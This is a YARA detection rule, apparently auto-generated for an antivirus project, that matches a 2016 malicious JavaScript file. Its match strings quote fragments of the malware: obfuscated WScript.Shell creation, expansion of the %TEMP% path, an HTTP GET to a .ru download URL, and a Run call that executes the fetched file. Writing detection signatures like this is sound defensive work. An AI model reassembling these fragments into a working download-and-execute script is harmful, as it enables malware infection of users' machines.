rule sig_20160427_945bcf97ed545a43c64c63adf43d286e {
  meta:
    description = "datamaliciousorder - file 20160427_945bcf97ed545a43c64c63adf43d286e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "724e2aa3373ba20ad5a92052ef047ee0a73a06f06cca402c9809b4d41b78eb60"

  strings:
    $s1  = "function BqddiBiqxh() {return LowglLnpyg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QgkrN42" ascii
    $s2  = "function BqddiBiqxh() {return LowglLnpyg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QgkrN42" ascii
    $s3  = "function WefdbHvcnt(BmeuxDjeuk, PxeffXmyco){NqdaoMfkuk = NqdaoMfkuk * 1; return BmeuxDjeuk - PxeffXmyco;};" fullword ascii
    $s4  = "var LowglLnpyg = function JaernWjjns() {return AntgiWefvj[BbasaYuejj](\"WScript\"+\".Shell\");}(), KzauhQogmu = 11;" fullword ascii
    $s5  = "YkkpeEapvu[FgukhLgesk](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var AntgiWefvj = this[\"WScript\"];" fullword ascii
    $s7  = "function MxgitTfzkd(){return ZprqfHwmgk + \"\";};" fullword ascii
    $s8  = "if (YkkpeEapvu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function BlhbhVpzda() {return ((JbpqbQbjey == true) && (JbpqbQbjey == HvmcbHdicv)) ? 1 : NqdaoMfkuk;};" fullword ascii
    $s10 = "function PjcejLgexl(BqegbXghbs) {var HvrfaUibzs = (1, 2, 3, 4, 5, BqegbXghbs); return HvrfaUibzs;};" fullword ascii
    $s11 = "var JbpqbQbjey = false;" fullword ascii
    $s12 = "WbbqvRzyss = true;" fullword ascii
    $s13 = "function MzqjzGlrjq(){return 23;};" fullword ascii
    $s14 = "function AwohsMsibo()" fullword ascii
    $s15 = "return WefdbHvcnt(RstajWyzmr, QzrjkGesqc);" fullword ascii
    $s16 = "var HvmcbHdicv = false;" fullword ascii
    $s17 = "}while (EviywAbbjf);" fullword ascii
    $s18 = "JbpqbQbjey = true; " fullword ascii
    $s19 = "HvmcbHdicv = true; " fullword ascii
    $s20 = "function YyuwiRsjtq(EludfGihxu){LowglLnpyg[\"R\"+\"un\"](EludfGihxu, NqdaoMfkuk, NqdaoMfkuk);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}